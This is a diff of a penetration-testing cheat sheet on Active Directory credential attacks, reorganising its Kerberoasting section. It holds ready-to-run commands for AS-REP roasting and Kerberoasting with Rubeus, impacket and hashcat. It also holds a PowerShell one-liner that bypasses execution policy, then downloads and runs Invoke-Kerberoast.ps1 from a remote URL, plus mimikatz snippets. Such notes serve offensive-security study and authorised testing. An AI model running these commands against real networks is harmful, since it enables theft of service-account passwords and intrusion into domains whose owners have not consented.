@@ -264,7 +264,7 @@ Get plaintext password of user who "Do not require Kerberos preauthentication" u
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
 ```
 
-## on windows (use Rubeus)
+### on windows (use Rubeus)
 ```powershell
 #extract AS-REP hash
 .\Rubeus.exe asreproast /nowrap
@@ -273,9 +273,18 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
+## Kerberoast  [STEAL ticket]
+<aside>
+https://github.com/skelsec/kerberoast
+Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
+Kerberoasting requires a valid domain account.
+Three step process:
+- Find SPN tied to user accounts through LDAP (service accounts)
+- Request a TGS for each SPN
+- Crack the TGS offline to recover the service account's password
+</aside>
 
-
-## Kerberoast (https://github.com/skelsec/kerberoast)
+### On Kali
 - impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
@@ -303,7 +312,17 @@ or
 ```
 runas /user:<hostname>\<user> cmd.exe
 ```
-     
+
+### On Windows
+```bash
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
+
+# cracking TGS hashes
+hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
+OR
+hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
+```
+
 
 # Tools Introduction
 -   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
@@ -535,23 +554,7 @@ mimikatz # misc::cmd
 mimikatz # misc::cmd whoami
 ```
 
-### Kerberoasting [STEAL ticket]
-<aside>
-Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
-Kerberoasting requires a valid domain account.
-Three step process:
-- Find SPN tied to user accounts through LDAP (service accounts)
-- Request a TGS for each SPN
-- Crack the TGS offline to recover the service account's password
-</aside>
 
-```bash
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
-
-# cracking TGS hashes
-hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
-        hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
-```
 
 ### Manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
 - method 1
